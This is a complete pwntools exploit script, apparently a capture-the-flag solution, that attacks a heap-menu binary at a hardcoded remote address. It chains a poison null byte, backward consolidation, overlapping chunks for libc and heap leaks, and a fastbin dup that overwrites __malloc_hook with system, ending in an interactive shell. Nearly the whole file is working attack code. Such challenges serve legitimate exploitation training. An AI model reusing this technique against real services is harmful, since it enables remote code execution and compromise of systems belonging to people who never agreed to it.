#!/usr/bin/env python3


from pwn import *

index = 0

def malloc(size):
    global index
    r.sendafter(b'>>',b'1\n')
    r.sendafter(b'size:',f"{size}")
    index+=1
    return index - 1

def free(index):
    r.sendafter(b'>>',b'2\n')
    r.sendafter(b'index:',f"{index}\n")

def edit(index,data):
    r.sendafter(b'>>',b'3\n')
    r.sendafter(b'index:',f"{index}\n")
    r.sendafter(b'data:',data)

def read_leak(index):
    r.sendafter(b">>",b"4\n")
    r.sendafter(b'index:',f"{index}\n")
    r.recvuntil(p64(0x91))
    libc_leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
    r.recvuntil(p64(0x70))
    heap_leak = u64(r.recvline().strip()[0:6].decode('latin-1').ljust(8,'\x00'))
    return libc_leak,heap_leak

elf = ELF("./cute_little_vulnerable_storage")
libc = ELF("./libc.so.6")
r = remote("3.99.48.161",9005)
#r = process("./cute_little_vulnerable_storage")
r.timeout = 1.0
chunk_A = malloc(0x98)
chunk_F = malloc(0x68)
chunk_G = malloc(0x88)
chunk_B = malloc(0x68)
chunk_C = malloc(0x98)
chunk_D = malloc(0xf8)
chunk_E = malloc(0x28)
edit(chunk_C,b'A' * 0x90 + p64(0x2b0))
free(chunk_A)
log.info("Poison null byte to trigger a backward consolidation")
free(chunk_G)
free(chunk_D)
free(chunk_F)
free(chunk_B)
log.info("Freeing multiple chunks to get both libc and heap leak")
chunk_H = malloc(0x3a8)
log.info("Allocating the large chunk from unsorted bin due to backward consolidation")
log.info("This backward consolidation created a overlapping chunk to read the memory leak from the multiple frees before")
libc_leak,heap_leak = read_leak(chunk_H)
libc_base = libc_leak - (libc.sym["main_arena"] + 216)
log.info("The base address of libc is  " + hex(libc_base))
heap_base = heap_leak - 0xa0
log.info("The base address of heap is " + hex(heap_base))
fake_fast = libc_base + libc.sym["__malloc_hook"] - 35
log.info("Using the fake fast field from IO_wide_data present before the malloc hook to create the fake chunk")
payload = b'A' * 0x98 + p64(0x71) + p64(fake_fast)
edit(chunk_H,payload)
log.info("Using the Use after free primitive due to the overlapping chunk to create a fastbin dup primitive")
chunk_I = malloc(0x68)
chunk_J = malloc(0x68)
chunk_K = malloc(0x68)
system = libc_base + libc.sym["system"]
edit(chunk_K,b'A' * 19 + p64(system))
log.info("Malloc hook overwritten with system function address")
log.info("The location of system function in the libc is " + hex(system))
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
log.info("The location of /bin/sh string in libc is " +  hex(bin_sh))
chunk_L = malloc(bin_sh)
log.info("A single null byte overflow to create a house of einherjar primitive leading to a fastbin dup ended with a shell")
r.interactive()
